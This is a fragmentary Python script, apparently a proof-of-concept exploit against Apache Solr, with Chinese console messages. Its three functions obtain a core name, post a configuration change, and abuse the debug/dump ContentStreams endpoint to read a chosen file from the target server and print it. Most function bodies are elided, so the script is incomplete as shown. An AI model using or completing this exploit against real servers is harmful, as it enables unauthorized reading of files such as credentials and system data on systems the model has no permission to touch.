...
def POC_1(target_url):
    ...
    try:
        ...
        print("\033[32m[o] 成功获得core_name,Url为：" + target_url +
              "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
...
def POC_2(target_url, core_name):
    ...
    try:
        ...
        response = requests.post(
            url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
...
def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + \
        "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
    ...
    try:
        ...
        if "No such file or directory" in response.text:
            ...
            print("\033[36m[o] 响应为:\n{} \033[0m".format(
                json.loads(response.text)["streams"][0]["stream"]))
